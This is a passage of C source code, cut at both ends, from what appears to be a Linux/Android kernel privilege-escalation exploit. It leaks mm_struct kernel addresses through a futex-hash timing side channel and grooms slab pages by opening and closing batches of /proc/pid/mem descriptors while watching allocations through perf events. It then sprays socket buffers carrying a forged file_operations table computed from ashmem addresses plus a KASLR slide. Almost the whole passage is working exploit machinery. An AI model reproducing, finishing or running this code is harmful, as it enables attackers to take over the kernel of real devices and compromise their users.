        munmap(capture->kmem_map, capture->kmem_map_size);
    if (capture->object_free_map)
        munmap(capture->object_free_map, capture->object_free_map_size);
    if (capture->page_fd >= 0)
        close(capture->page_fd);
    if (capture->free_fd >= 0)
        close(capture->free_fd);
    if (capture->kmem_fd >= 0)
        close(capture->kmem_fd);
    if (capture->object_free_fd >= 0)
        close(capture->object_free_fd);
    capture->page_map = NULL;
    capture->free_map = NULL;
    capture->kmem_map = NULL;
    capture->object_free_map = NULL;
    capture->page_fd = -1;
    capture->free_fd = -1;
    capture->kmem_fd = -1;
    capture->object_free_fd = -1;
}

static void perf_capture_drain(struct perf_capture *capture)
{
    if (capture->page_map)
        perf_capture_pages(capture);
    if (capture->free_map)
        perf_capture_free_pages(capture);
    if (capture->kmem_map)
        perf_capture_kmem(capture);
    if (capture->object_free_map)
        perf_capture_object_free(capture);
}

static size_t perf_object_free_count_since(
    const struct perf_capture *capture, uintptr_t base, size_t start)
{
    size_t count = 0;

    for (size_t i = start; i < capture->object_free_count; ++i) {
        uintptr_t pointer = capture->object_frees[i].pointer;

        if (!perf_mm_free_event(&capture->object_frees[i]) ||
            (pointer & ~(ORDER3_SIZE - 1)) != base)
            continue;
        count++;
    }
    return count;
}

static void wait_target_frees(struct perf_capture *capture, uintptr_t base,
                              size_t expected, size_t start)
{
    size_t count = 0;

    for (unsigned int attempt = 0; attempt < 1000; ++attempt) {
        perf_capture_drain(capture);
        count = perf_object_free_count_since(capture, base, start);
        if (count >= expected)
            break;
        usleep(10000);
    }
    printf("PAGE_LEAK_TARGET_FREE_WAIT count=%zu expected=%zu\n",
           count, expected);
}

static int perf_candidate_alloc_match(const struct perf_capture *capture,
                                      uintptr_t base)
{
    uintptr_t nearest_alias = 0;
    uint64_t nearest_pages = UINT64_MAX;
    uint32_t nearest_gfp = 0;
    int32_t nearest_mt = -1;

    for (size_t i = 0; i < capture->page_count; ++i) {
        uint64_t physical;
        uint64_t delta_pages;
        uintptr_t alias;

        if (capture->pages[i].order != SKB_RECLAIM_ORDER)
            continue;
        physical = capture->pages[i].pfn << 12;
        if (physical < PHYS_OFFSET)
            continue;
        alias = PAGE_OFFSET | (physical - PHYS_OFFSET);
        delta_pages = alias > base ? (alias - base) / PAGE_SIZE :
                                     (base - alias) / PAGE_SIZE;
        if (delta_pages < nearest_pages) {
            nearest_alias = alias;
            nearest_pages = delta_pages;
            nearest_gfp = capture->pages[i].gfp_flags;
            nearest_mt = capture->pages[i].migratetype;
        }
        if (alias == base) {
            printf("PAGE_CALIBRATION_ALLOC_CANDIDATE_EVENT pfn=0x%016" PRIx64
                   " order=%u gfp=0x%08x mt=%d base=0x%016zx\n",
                   capture->pages[i].pfn, capture->pages[i].order,
                   capture->pages[i].gfp_flags,
                   capture->pages[i].migratetype, alias);
            return 1;
        }
    }
    if (nearest_alias)
        printf("PAGE_CALIBRATION_ALLOC_NEAREST candidate=0x%016zx base=0x%016zx delta_pages=%" PRIu64 " order=%u gfp=0x%08x mt=%d\n",
               base, nearest_alias, nearest_pages, SKB_RECLAIM_ORDER,
               nearest_gfp, nearest_mt);
    return 0;
}

static int perf_candidate_page_free_match(const struct perf_capture *capture,
                                           uintptr_t base)
{
    for (size_t i = 0; i < capture->free_page_count; ++i) {
        uint64_t physical = capture->free_pages[i].pfn << 12;
        uintptr_t alias;
        uint64_t size;

        if (capture->free_pages[i].order < MM_ORDER ||
            physical < PHYS_OFFSET)
            continue;
        alias = PAGE_OFFSET | (physical - PHYS_OFFSET);
        size = PAGE_SIZE << capture->free_pages[i].order;
        if (alias == base || (alias <= base && base < alias + size))
            return 1;
    }
    return 0;
}

static int perf_candidate_match(const struct perf_capture *capture,
                                uintptr_t leaked, uintptr_t base)
{
    int kmem_exact = 0;
    int kmem_base = 0;
    size_t kmem_page_allocs = 0;
    size_t kmem_page_unique = 0;
    uint64_t kmem_page_bitmap = 0;
    int object_free_exact = 0;
    int object_free_base = 0;
    size_t object_free_page_frees = 0;
    size_t object_free_page_unique = 0;
    size_t object_free_page_slots = 0;
    uint64_t object_free_page_bitmap = 0;
    int page_base = 0;
    int page_free_base = 0;

    for (size_t i = 0; i < capture->kmem_count; ++i) {
        if (capture->kmem[i].requested != MM_STRUCT_SZ)
            continue;
        if (capture->kmem[i].pointer == leaked)
            kmem_exact = 1;
        if ((capture->kmem[i].pointer & ~(ORDER3_SIZE - 1)) == base) {
            kmem_base = 1;
            kmem_page_allocs++;
            {
                int seen = 0;
                uintptr_t offset = capture->kmem[i].pointer - base;

                for (size_t j = 0; j < i; ++j) {
                    if (capture->kmem[j].requested == MM_STRUCT_SZ &&
                        capture->kmem[j].pointer ==
                            capture->kmem[i].pointer) {
                        seen = 1;
                        break;
                    }
                }
                if (!seen)
                    kmem_page_unique++;
                if (offset < ORDER3_SIZE &&
                    offset % MM_STRUCT_SZ == 0) {
                    size_t slot = offset / MM_STRUCT_SZ;
                    kmem_page_bitmap |= UINT64_C(1) << slot;
                }
            }
        }
    }
    for (size_t i = 0; i < capture->object_free_count; ++i) {
        if (!perf_mm_free_event(&capture->object_frees[i]))
            continue;
        if (capture->object_frees[i].pointer == leaked)
            object_free_exact = 1;
        if (perf_mm_free_event(&capture->object_frees[i]) &&
            (capture->object_frees[i].pointer & ~(ORDER3_SIZE - 1)) == base) {
            int seen = 0;

            object_free_base = 1;
            object_free_page_frees++;
            for (size_t j = 0; j < i; ++j) {
                if (capture->object_frees[j].pointer ==
                    capture->object_frees[i].pointer) {
                    seen = 1;
                    break;
                }
            }
            if (!seen)
                object_free_page_unique++;
            {
                uintptr_t offset = capture->object_frees[i].pointer - base;
                if (offset < ORDER3_SIZE &&
                    offset % MM_STRUCT_SZ == 0) {
                    size_t slot = offset / MM_STRUCT_SZ;
                    uint64_t bit = UINT64_C(1) << slot;

                    if (!(object_free_page_bitmap & bit)) {
                        object_free_page_bitmap |= bit;
                        object_free_page_slots++;
                    }
                }
            }
        }
    }
    {
        size_t candidate_free_events = 0;

        for (size_t i = 0; i < capture->free_page_count; ++i) {
            uint64_t physical = capture->free_pages[i].pfn << 12;
            uintptr_t alias;

            if (physical < PHYS_OFFSET)
                continue;
            alias = PAGE_OFFSET | (physical - PHYS_OFFSET);
            if (alias >= base && alias < base + ORDER3_SIZE) {
                printf("PAGE_CALIBRATION_FREE_CANDIDATE_EVENT pfn=0x%016" PRIx64
                       " order=%u base=0x%016zx\n",
                       capture->free_pages[i].pfn,
                       capture->free_pages[i].order, alias);
                candidate_free_events++;
            }
        }
        if (candidate_free_events)
            printf("PAGE_CALIBRATION_FREE_CANDIDATE_COUNT count=%zu\n",
                   candidate_free_events);
    }
    page_base = perf_candidate_alloc_match(capture, base);
    page_free_base = perf_candidate_page_free_match(capture, base);
    printf("PAGE_CALIBRATION_COMPARE candidate=0x%016zx kmem_exact=%d kmem_base=%d kmem_page_allocs=%zu kmem_page_unique=%zu kmem_page_bitmap=0x%016" PRIx64 " object_free_exact=%d object_free_base=%d object_free_page_frees=%zu object_free_page_unique=%zu object_free_page_slots=%zu object_free_page_bitmap=0x%016" PRIx64 " page_alloc_base=%d page_alloc_order=%d page_free_base=%d accepted=%d\n",
           base, kmem_exact, kmem_base, kmem_page_allocs, kmem_page_unique,
           kmem_page_bitmap, object_free_exact, object_free_base,
           object_free_page_frees, object_free_page_unique,
           object_free_page_slots, object_free_page_bitmap, page_base,
           SKB_RECLAIM_ORDER,
           page_free_base,
           kmem_exact || kmem_base ||
           object_free_exact || object_free_base || page_base || page_free_base);
    return kmem_exact || kmem_base || object_free_exact || object_free_base ||
        page_base || page_free_base;
}

static void perf_trigger_summary(const struct perf_capture *capture)
{
    struct trigger_page {
        uintptr_t base;
        uint64_t alloc_bitmap;
        uint64_t free_bitmap;
    } pages[512] = {0};
    size_t page_count = 0;
    size_t full_alloc = 0;
    size_t full_free = 0;
    size_t max_alloc = 0;
    size_t max_free = 0;

    for (size_t i = 0; i < capture->kmem_count; ++i) {
        uintptr_t pointer = capture->kmem[i].pointer;
        uintptr_t base;
        uintptr_t offset;
        size_t page = 0;

        if (!perf_mm_alloc_event(&capture->kmem[i]))
            continue;
        base = pointer & ~(ORDER3_SIZE - 1);
        offset = pointer - base;
        if (offset >= ORDER3_SIZE || offset % MM_STRUCT_SZ)
            continue;
        while (page < page_count && pages[page].base != base)
            page++;
        if (page == page_count) {
            if (page_count == sizeof(pages) / sizeof(pages[0]))
                break;
            pages[page_count++].base = base;
        }
        pages[page].alloc_bitmap |= UINT64_C(1) << (offset / MM_STRUCT_SZ);
    }
    for (size_t i = 0; i < capture->object_free_count; ++i) {
        uintptr_t pointer = capture->object_frees[i].pointer;

        for (size_t page = 0; page < page_count; ++page) {
            uintptr_t offset;

            if ((pointer & ~(ORDER3_SIZE - 1)) != pages[page].base)
                continue;
            offset = pointer - pages[page].base;
            if (offset < ORDER3_SIZE && offset % MM_STRUCT_SZ == 0 &&
                (pages[page].alloc_bitmap &
                 (UINT64_C(1) << (offset / MM_STRUCT_SZ))))
                pages[page].free_bitmap |=
                    UINT64_C(1) << (offset / MM_STRUCT_SZ);
            break;
        }
    }
    for (size_t page = 0; page < page_count; ++page) {
        size_t alloc_slots = (size_t)__builtin_popcountll(
            pages[page].alloc_bitmap);
        size_t free_slots = (size_t)__builtin_popcountll(
            pages[page].free_bitmap);

        if (alloc_slots > max_alloc)
            max_alloc = alloc_slots;
        if (free_slots > max_free)
            max_free = free_slots;
        if (alloc_slots == ORDER3_SIZE / MM_STRUCT_SZ)
            full_alloc++;
        if (free_slots == ORDER3_SIZE / MM_STRUCT_SZ)
            full_free++;
        if (alloc_slots >= ORDER3_SIZE / MM_STRUCT_SZ - 1)
            printf("PAGE_CALIBRATION_TRIGGER_PAGE base=0x%016zx alloc=%zu free=%zu bitmap=0x%016" PRIx64 "\n",
                   pages[page].base, alloc_slots, free_slots,
                   pages[page].alloc_bitmap);
    }
    printf("PAGE_CALIBRATION_TRIGGER_SUMMARY pages=%zu full_alloc=%zu full_free=%zu max_alloc=%zu max_free=%zu\n",
           page_count, full_alloc, full_free, max_alloc, max_free);
}

static size_t kernelsnitch_collision_time(
    const struct kernelsnitch_shared_state *ks, size_t address)
{
    for (size_t i = 2; i < ks->total_futexes; ++i) {
        size_t id = (i * KS_PAGE_SIZE) |
            (i * 8 % KS_PAGE_SIZE);
        if ((size_t)&ks->futexes[id] == address)
            return ks->times[i];
    }
    return 0;
}

static void print_ks_details(const struct kernelsnitch_shared_state *ks,
                             uintptr_t leaked)
{
    size_t slab_offset = leaked & (ORDER3_SIZE - 1);
    printf("PAGE_LEAK_KS_CACHE name=mm_struct object_size=0x%zx slab_order=%d slab_bytes=0x%zx objects=%zu\n",
           (size_t)MM_STRUCT_SZ, MM_ORDER, (size_t)ORDER3_SIZE,
           (size_t)(ORDER3_SIZE / MM_STRUCT_SZ));
    printf("PAGE_LEAK_KS_PARAMS collisions=%zu repeat=%zu average=%zu threshold=%zu appended=%zu\n",
           ks->collisions, ks->repeat_measurement, ks->average,
           ks->threshold_mult, ks->appended_futexes);
    printf("PAGE_LEAK_KS_OBJECT mm=0x%016zx slab_offset=0x%zx object_index=%zu object_remainder=0x%zx\n",
           leaked, slab_offset, slab_offset / MM_STRUCT_SZ,
           slab_offset % MM_STRUCT_SZ);
    for (size_t i = 1; i < ks->collisions; ++i)
        printf("PAGE_LEAK_KS_COLLISION index=%zu futex=0x%016zx time=%zu\n",
               i, ks->futex_addrs[i],
               kernelsnitch_collision_time(ks, ks->futex_addrs[i]));
}

static pid_t spawn_paused(void)
{
    pid_t child = fork();
    if (child < 0)
        die("fork");
    if (child == 0) {
        if (prctl(PR_SET_PDEATHSIG, SIGKILL) < 0)
            _exit(2);
        if (getppid() == 1)
            _exit(3);
        if (getenv("PAGE_LEAK_PIN_CHILDREN"))
            pin_to_core(0);
        for (;;) {
            pause();
        }
    }
    return child;
}

static pid_t spawn_prep_child(void)
{
    pid_t child = fork();

    if (child < 0)
        die("fork prep");
    if (child == 0) {
        if (prctl(PR_SET_PDEATHSIG, SIGKILL) < 0)
            _exit(2);
        if (getppid() == 1)
            _exit(3);
        pin_to_core(0);
        for (;;) {
            pause();
        }
    }
    return child;
}

static pid_t spawn_collision(struct kernelsnitch_shared_state *ks)
{
    pid_t child = fork();
    if (child < 0)
        die("fork collision");
    if (child == 0) {
        if (prctl(PR_SET_PDEATHSIG, SIGKILL) < 0)
            _exit(2);
        if (getppid() == 1)
            _exit(3);
        kernelsnitch_find_collisions(ks);
        if (getenv("PAGE_LEAK_KEEP_LEAK_CHILD")) {
            raise(SIGSTOP);
            for (;;)
                pause();
        }
        _exit(kernelsnitch_found_collisions(ks) ? 0 : 4);
    }
    return child;
}

static pid_t spawn_collision_dual(
    struct kernelsnitch_shared_state *first,
    struct kernelsnitch_shared_state *second)
{
    pid_t child = fork();
    if (child < 0)
        die("fork dual collision");
    if (child == 0) {
        if (prctl(PR_SET_PDEATHSIG, SIGKILL) < 0)
            _exit(2);
        if (getppid() == 1)
            _exit(3);
        kernelsnitch_find_collisions(first);
        if (!kernelsnitch_found_collisions(first))
            _exit(4);
        kernelsnitch_find_collisions(second);
        if (getenv("PAGE_LEAK_KEEP_LEAK_CHILD")) {
            raise(SIGSTOP);
            for (;;)
                pause();
        }
        _exit(kernelsnitch_found_collisions(second) ? 0 : 5);
    }
    return child;
}

static int open_mem(pid_t child)
{
    char path[64];
    int fd;
    snprintf(path, sizeof(path), "/proc/%d/mem", child);
    fd = open(path, O_RDONLY | O_CLOEXEC);
    if (fd < 0)
        die(path);
    return fd;
}

static void reap_child(pid_t child)
{
    if (child <= 0)
        return;
    check_int(kill(child, SIGKILL), "kill");
    check_int(waitpid(child, NULL, 0), "waitpid");
}

static int clone_memfd(void)
{
    pid_t child = spawn_paused();
    int fd = open_mem(child);
    reap_child(child);
    return fd;
}

static void ctx_init(struct mm_ctx *ctx, size_t count)
{
    ctx->count = count;
    ctx->children = calloc(count, sizeof(*ctx->children));
    ctx->memfds = calloc(count, sizeof(*ctx->memfds));
    if (!ctx->children || !ctx->memfds)
        die("calloc context");
    for (size_t i = 0; i < count; ++i) {
        ctx->children[i] = -1;
        ctx->memfds[i] = -1;
    }
}

static void close_ctx(struct mm_ctx *ctx)
{
    for (size_t i = 0; i < ctx->count; ++i) {
        if (ctx->memfds[i] >= 0) {
            check_int(close(ctx->memfds[i]), "close memfd");
            ctx->memfds[i] = -1;
        }
        if (ctx->children[i] > 0) {
            reap_child(ctx->children[i]);
            ctx->children[i] = -1;
        }
    }
    free(ctx->children);
    free(ctx->memfds);
    ctx->children = NULL;
    ctx->memfds = NULL;
    ctx->count = 0;
}

static ssize_t send_blob_flags(int fd, unsigned char *blob, int flags)
{
    struct iovec iov;
    struct msghdr msg;

    memset(&iov, 0, sizeof(iov));
    iov.iov_base = blob;
    iov.iov_len = SKB_SEND_SIZE;
    memset(&msg, 0, sizeof(msg));
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    return sendmsg(fd, &msg, flags);
}

static void blob_put64(unsigned char *blob, size_t offset, uint64_t value)
{
    memcpy(blob + offset, &value, sizeof(value));
}

static void fill_skb_fops(unsigned char *blob, uint64_t slide)
{
    static const struct {
        size_t offset;
        uint64_t image;
    } slots[] = {
        {0x00, 0},
        {0x08, ASHMEM_FOPS_08_IMAGE},
        {0x10, ASHMEM_FOPS_10_IMAGE},
        {0x18, ASHMEM_FOPS_18_IMAGE},
        {0x50, ASHMEM_FOPS_50_IMAGE},
        {0x58, ASHMEM_FOPS_58_IMAGE},
        {0x60, ASHMEM_FOPS_60_IMAGE},
        {0x70, ASHMEM_FOPS_70_IMAGE},
        {0x80, ASHMEM_FOPS_80_IMAGE},
        {0xc8, ASHMEM_FOPS_C8_IMAGE},
        {0xe0, ASHMEM_FOPS_E0_IMAGE},
    };
    size_t base = SKB_PAYLOAD_OFFSET + FOPS_OFFSET;

    memset(blob + base, 0, FOPS_TABLE_SIZE);
    memset(blob + ORDER3_SIZE + base, 0, FOPS_TABLE_SIZE);
    for (size_t i = 0; i < sizeof(slots) / sizeof(slots[0]); ++i)
        blob_put64(blob, base + slots[i].offset, slots[i].image + slide);
    for (size_t i = 0; i < sizeof(slots) / sizeof(slots[0]); ++i)
        blob_put64(blob, ORDER3_SIZE + base + slots[i].offset,
                   slots[i].image + slide);
}

static void send_blob(int fd, unsigned char *blob)
{
    ssize_t sent = send_blob_flags(fd, blob, 0);

    if (sent != SKB_SEND_SIZE)
        die("sendmsg");
}

static unsigned long send_blob_spray(int fd, unsigned char *blob,
                                     unsigned long requested)
{
    unsigned long full = 0;
    ssize_t last_ret = 0;
    int last_errno = 0;

    if (!requested)
        requested = 1;
    for (unsigned long i = 0; i < requested; ++i) {
        int flags = i ? MSG_DONTWAIT : 0;

        errno = 0;
        last_ret = send_blob_flags(fd, blob, flags);
        last_errno = errno;
        if (last_ret != SKB_SEND_SIZE) {
            printf("PAGE_LEAK_SKB_SEND_STOP index=%lu/%lu ret=%zd errno=%d t_ms=%" PRIu64 "\n",
                   i + 1, requested, last_ret, last_errno, elapsed_ms());
            break;
        }
        full++;
        if (getenv("PAGE_LEAK_VERBOSE"))
            printf("PAGE_LEAK_SKB_SEND index=%lu/%lu ret=%zd t_ms=%" PRIu64 "\n",
                   i + 1, requested, last_ret, elapsed_ms());
    }
    printf("PAGE_LEAK_SKB_SENT requested=%lu full=%lu last_ret=%zd last_errno=%d t_ms=%" PRIu64 "\n",
           requested, full, last_ret, last_errno, elapsed_ms());
    return full;
}

static unsigned long env_ulong(const char *name, unsigned long fallback)
{
    const char *raw = getenv(name);
    char *end = NULL;
    unsigned long value;

    if (!raw || !*raw)
        return fallback;
    errno = 0;
    value = strtoul(raw, &end, 0);
    if (errno || end == raw || *end)
        return fallback;
    return value;
}

static size_t flush_alloc_batch(unsigned long pages, size_t batch,
                                int reverse)
{
    size_t total = (size_t)pages * batch;
    int *fds = calloc(total, sizeof(*fds));

    if (!fds)
        die("calloc flush alloc");
    for (size_t i = 0; i < total; ++i)
        fds[i] = clone_memfd();
    if (reverse) {
        for (size_t i = total; i > 0; --i)
            check_int(close(fds[i - 1]), "close flush alloc");
    } else {
        for (size_t i = 0; i < total; ++i)
            check_int(close(fds[i]), "close flush alloc");
    }
    free(fds);
    return total;
}

static size_t flush_rotate_dummy(size_t batch)
{
    size_t total = batch + 1;
    int *fds = calloc(total, sizeof(*fds));

    if (!fds)
        die("calloc rotate dummy");
    for (size_t i = 0; i < total; ++i)
        fds[i] = clone_memfd();
    check_int(close(fds[batch]), "close rotate pulled slab");
    fds[batch] = -1;
    for (size_t i = 0; i < batch; ++i) {
        check_int(close(fds[i]), "close rotate target slab");
        fds[i] = -1;
    }
    free(fds);
    return total;
}

static int perf_kmem_event_since(const struct perf_capture *capture,
                                 size_t start, uintptr_t *object_pointer,
                                 uintptr_t *page_base)
{
    for (size_t i = start; i < capture->kmem_count; ++i) {
        if (capture->kmem[i].pid != getpid() ||
            !perf_mm_alloc_event(&capture->kmem[i]))
            continue;
        if (object_pointer)
            *object_pointer = capture->kmem[i].pointer;
        if (page_base)
            *page_base = capture->kmem[i].pointer & ~(ORDER3_SIZE - 1);
        return 1;
    }
    return 0;
}

static void wait_before_s1(void);
static void wait_before_post_trigger(void);

static int flush_target_rotate(struct perf_capture *perf, uintptr_t base,
                               size_t batch, unsigned long max_refs)
{
    int *fds = calloc(max_refs, sizeof(*fds));
    int *target_fds = calloc(batch, sizeof(*target_fds));
    uintptr_t *target_pointer = calloc(batch, sizeof(*target_pointer));
    unsigned char *keep = calloc(max_refs, sizeof(*keep));
    size_t target_count = 0;
    size_t total = 0;

    if (!fds || !target_fds || !target_pointer || !keep)
        die("calloc target rotate");
    for (unsigned long attempt = 0; attempt < max_refs; ++attempt) {
        size_t kmem_before = perf->kmem_count;
        uintptr_t event_pointer = 0;
        uintptr_t event_base = 0;
        int fd = clone_memfd();

        fds[total] = fd;
        total++;
        perf_capture_drain(perf);
        if (perf_kmem_event_since(perf, kmem_before, &event_pointer,
                                  &event_base)) {
            if (event_base == base && target_count < batch) {
                target_fds[target_count] = fds[total - 1];
                target_pointer[target_count] = event_pointer;
                keep[total - 1] = 1;
                printf("PAGE_LEAK_TARGET_ALLOC index=%zu fd=%d ptr=0x%016zx\n",
                       target_count, fd, event_pointer);
                target_count++;
            }
        }
        if (target_count == batch)
            break;
    }
    if (target_count != batch) {
        for (size_t i = 0; i < total; ++i)
            check_int(close(fds[i]), "close incomplete target rotate");
        free(keep);
        free(fds);
        free(target_pointer);
        free(target_fds);
        return 0;
    }
    for (size_t i = 0; i < total; ++i) {
        if (!keep[i])
            check_int(close(fds[i]), "close non-target rotate");
    }
    free(keep);
    free(fds);
    if (getenv("PAGE_LEAK_REQUIRE_PAGE_FREE")) {
        perf_capture_stop(perf);
        unsetenv("PAGE_LEAK_PERF_KMEM_ONLY");
        if (getenv("PAGE_LEAK_PERF_SWITCH_BOTH")) {
            unsetenv("PAGE_LEAK_PERF_PAGE_FREE");
            setenv("PAGE_LEAK_PERF_BOTH", "1", 1);
        } else {
            setenv("PAGE_LEAK_PERF_PAGE_FREE", "1", 1);
            unsetenv("PAGE_LEAK_PERF_BOTH");
        }
        if (!perf_capture_start(perf)) {
            for (size_t i = 0; i < batch; ++i)
                check_int(close(target_fds[i]),
                          "close target after perf switch");
            free(target_pointer);
            free(target_fds);
            return 0;
        }
    } else {
        perf_capture_stop(perf);
    }
    {
        size_t unique = 0;

        for (size_t i = 0; i < batch; ++i) {
            int seen = 0;

            for (size_t j = 0; j < i; ++j) {
                if (target_pointer[j] == target_pointer[i]) {
                    seen = 1;
                    break;
                }
            }
            if (!seen)
                unique++;
        }
        printf("PAGE_LEAK_TARGET_UNIQUE count=%zu total=%zu cpu=%d\n",
               unique, batch, sched_getcpu());
    }
    printf("PAGE_LEAK_TARGET_FREE_CPU cpu=%d\n", sched_getcpu());
    wait_before_post_trigger();
    {
        unsigned long trigger_pages = env_ulong(
            "PAGE_LEAK_POST_TRIGGER_PAGES", 14);

        if (!trigger_pages || trigger_pages > max_refs / batch)
            die("bad target post trigger count");
        size_t trigger_refs = (size_t)trigger_pages * batch;
        unsigned long pool_env = env_ulong(
            "PAGE_LEAK_POST_TRIGGER_POOL", trigger_refs + batch);
        size_t pool_cap = pool_env;
        if (pool_cap < trigger_refs)
            pool_cap = trigger_refs;
        if (pool_cap > max_refs - batch - 1)
            pool_cap = max_refs - batch - 1;
        if (!pool_cap)
            die("bad target post trigger pool");
        int *pool_fds = calloc(pool_cap, sizeof(*pool_fds));
        unsigned char *pool_selected = calloc(pool_cap, sizeof(*pool_selected));
        int *trigger_fds = calloc(trigger_refs, sizeof(*trigger_fds));
        uintptr_t *trigger_bases = calloc(trigger_pages, sizeof(*trigger_bases));
        size_t *group_counts = calloc(pool_cap, sizeof(*group_counts));
        uintptr_t *group_bases = calloc(pool_cap, sizeof(*group_bases));
        int *group_fds = calloc(pool_cap * batch, sizeof(*group_fds));
        int trigger_pull = -1;
        size_t pool_count = 0;
        size_t group_count = 0;
        size_t complete = 0;

        if (!pool_fds || !pool_selected || !trigger_fds || !trigger_bases ||
            !group_counts || !group_bases || !group_fds)
            die("calloc target post trigger");
        while (pool_count < pool_cap && complete < trigger_pages) {
            size_t kmem_before = perf->kmem_count;
            uintptr_t event_pointer = 0;
            uintptr_t event_base = 0;
            size_t group = pool_cap;

            pool_fds[pool_count] = clone_memfd();
            perf_capture_drain(perf);
            if (perf_kmem_event_since(perf, kmem_before, &event_pointer,
                                      &event_base) && event_base != base) {
                for (size_t i = 0; i < group_count; ++i) {
                    if (group_bases[i] == event_base) {
                        group = i;
                        break;
                    }
                }
                if (group == pool_cap && group_count < pool_cap) {
                    group = group_count++;
                    group_bases[group] = event_base;
                }
                if (group < pool_cap && group_counts[group] < batch) {
                    size_t slot = group_counts[group]++;
                    group_fds[group * batch + slot] = pool_fds[pool_count];
                    if (group_counts[group] == batch)
                        complete++;
                }
            }
            pool_count++;
        }
        if (complete != trigger_pages) {
            printf("PAGE_LEAK_TARGET_POST_TRIGGER_POOL_FAIL pool=%zu groups=%zu complete=%zu need=%lu\n",
                   pool_count, group_count, complete, trigger_pages);
            for (size_t i = 0; i < group_count && i < 64; ++i)
                printf("PAGE_LEAK_TARGET_POST_TRIGGER_GROUP index=%zu base=0x%016zx count=%zu\n",
                       i, group_bases[i], group_counts[i]);
            fflush(stdout);
            die("target post trigger full slabs");
        }
        size_t selected_groups = 0;
        for (size_t group = 0;
             group < group_count && selected_groups < trigger_pages; ++group) {
            if (group_counts[group] != batch)
                continue;
            trigger_bases[selected_groups] = group_bases[group];
            for (size_t i = 0; i < batch; ++i)
                trigger_fds[selected_groups * batch + i] =
                    group_fds[group * batch + i];
            selected_groups++;
        }
        if (selected_groups != trigger_pages)
            die("target post trigger select slabs");
        for (unsigned long page = 0; page < trigger_pages; ++page)
            printf("PAGE_LEAK_TARGET_POST_TRIGGER page=%lu/%lu base=0x%016zx held=%zu cpu=%d\n",
                   page + 1, trigger_pages, trigger_bases[page], batch,
                   sched_getcpu());
        for (size_t i = 0; i < pool_count; ++i) {
            for (size_t page = 0; page < trigger_pages && !pool_selected[i];
                 ++page) {
                for (size_t slot = 0; slot < batch; ++slot) {
                    if (pool_fds[i] == trigger_fds[page * batch + slot]) {
                        pool_selected[i] = 1;
                        break;
                    }
                }
            }
        }
        for (size_t i = 0; i < pool_count; ++i) {
            if (!pool_selected[i])
                check_int(close(pool_fds[i]), "close unused post trigger");
        }
        free(group_fds);
        free(group_bases);
        free(group_counts);
        {
            size_t kmem_before = perf->kmem_count;
            uintptr_t event_pointer = 0;
            uintptr_t event_base = 0;

            trigger_pull = clone_memfd();
            perf_capture_drain(perf);
            if (!perf_kmem_event_since(perf, kmem_before, &event_pointer,
                                       &event_base))
                die("target post trigger pull");
            for (unsigned long page = 0; page < trigger_pages; ++page) {
                if (event_base == trigger_bases[page])
                    die("target post trigger pull reused");
            }
            printf("PAGE_LEAK_TARGET_POST_TRIGGER_S2 fd=%d base=0x%016zx cpu=%d\n",
                   trigger_pull, event_base, sched_getcpu());
        }
        printf("PAGE_LEAK_TARGET_ROTATE_S1_READY target=%zu triggers=%lu s2=1\n",
               batch, trigger_pages);
        wait_before_s1();
        printf("PAGE_LEAK_S1_FREE_CPU cpu=%d\n", sched_getcpu());
        size_t target_free_start = perf->object_free_count;
        for (size_t i = 0; i + 1 < batch; ++i)
            check_int(close(target_fds[i]), "close target slab");
        printf("PAGE_LEAK_TARGET_PARTIAL held=1 cpu=%d\n", sched_getcpu());
        printf("PAGE_LEAK_TARGET_ROTATE_POST_FREE_BEGIN pages=%lu cpu=%d\n",
               trigger_pages, sched_getcpu());
        for (unsigned long page = 0; page < trigger_pages; ++page) {
            check_int(close(trigger_fds[(size_t)page * batch]),
                      "close target post trigger head");
            printf("PAGE_LEAK_TARGET_POST_TRIGGER_FREE page=%lu/%lu base=0x%016zx cpu=%d\n",
                   page + 1, trigger_pages, trigger_bases[page],
                   sched_getcpu());
        }
        for (unsigned long page = 0; page < trigger_pages; ++page) {
            for (size_t i = 1; i < batch; ++i)
                check_int(close(trigger_fds[(size_t)page * batch + i]),
                          "close target post trigger slab");
        }
        check_int(close(trigger_pull), "close target post trigger s2");
        check_int(close(target_fds[batch - 1]), "close target slab tail");
        printf("PAGE_LEAK_TARGET_TAIL_FREE cpu=%d\n", sched_getcpu());
        wait_target_frees(perf, base, batch, target_free_start);
        free(trigger_bases);
        free(trigger_fds);
        free(pool_selected);
        free(pool_fds);
    }
    printf("PAGE_LEAK_TARGET_ROTATE_FREE target=%zu s1=%zu s2=%zu cpu=%d\n",
           batch, batch, batch + 1, sched_getcpu());
    free(target_pointer);
    free(target_fds);
    return 1;
}

static uintptr_t match_controlled_mm_page(
    const struct kernelsnitch_shared_state *ks, uintptr_t base,
    size_t *match_count_out)
{
    uintptr_t end = base + ORDER3_SIZE;
    uintptr_t found = (uintptr_t)-1;
    size_t match_count = 0;

    if (ks->mte_enabled) {
        if (match_count_out)
            *match_count_out = 0;
        return (uintptr_t)-1;
    }
    for (uintptr_t candidate = base; candidate < end;
         candidate += MM_STRUCT_SZ) {
        size_t hash = futex_hash(ks->futex_addrs[0], candidate);
        size_t matches = 1;

        for (size_t i = 1; i < ks->collisions; ++i)
            matches += hash == futex_hash(ks->futex_addrs[i], candidate);
        if (matches == ks->collisions) {
            found = candidate;
            match_count++;
        }
    }
    if (match_count_out)
        *match_count_out = match_count;
    return match_count == 1 ? found : (uintptr_t)-1;
}

static int leak_one_controlled_mm(size_t cpu_count, uintptr_t hint_base,
                                  uintptr_t *mm_out, int *hint_hit_out)
{
    uintptr_t current_hint = hint_base;
    size_t collision_count = hint_base ? 2 : 4;
    size_t pass_count = hint_base ? 2 : 1;

    if (hint_hit_out)
        *hint_hit_out = 0;

    for (size_t pass = 0; pass < pass_count; ++pass) {
        struct kernelsnitch_shared_state *one = kernelsnitch_setup(
            MM_STRUCT_SZ, MM_ORDER, cpu_count, collision_count,
            getenv("PAGE_LEAK_VERBOSE") ? 1 : 0, 0);
        pid_t child;
        int fd;
        int status;

        if (!one)
            return -1;
        child = spawn_collision(one);
        fd = open_mem(child);
        if (waitpid(child, &status, 0) < 0) {
            close(fd);
            one->state = KERNELSNITCH_MM_NOT_FOUND;
            kernelsnitch_cleanup(one);
            return -1;
        }
        if (!WIFEXITED(status) || WEXITSTATUS(status) != 0 ||
            !kernelsnitch_found_collisions(one)) {
            close(fd);
            one->state = KERNELSNITCH_MM_NOT_FOUND;
            kernelsnitch_cleanup(one);
            if (current_hint) {
                current_hint = 0;
                collision_count = 4;
                continue;
            }
            return -2;
        }
        if (current_hint) {
            size_t match_count = 0;

